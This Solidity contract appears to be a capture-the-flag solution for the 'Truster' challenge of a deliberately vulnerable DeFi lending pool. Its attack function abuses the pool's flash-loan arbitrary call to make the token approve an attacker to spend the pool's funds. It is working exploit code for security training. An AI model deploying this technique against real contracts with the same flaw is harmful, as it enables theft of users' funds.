// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

contract TrusterAttacker {
    TrusterLenderPool lender;

    constructor(address _lender) {
        lender = TrusterLenderPool(_lender);
    }

    function attack(address _attacker, uint256 _amount) external {
        address target = address(lender.damnValuableToken());
        lender.flashLoan(
            0,
            address(this),
            target,
            abi.encodeWithSignature(
                "approve(address,uint256)",
                _attacker,
                _amount
            )
        );
    }
}
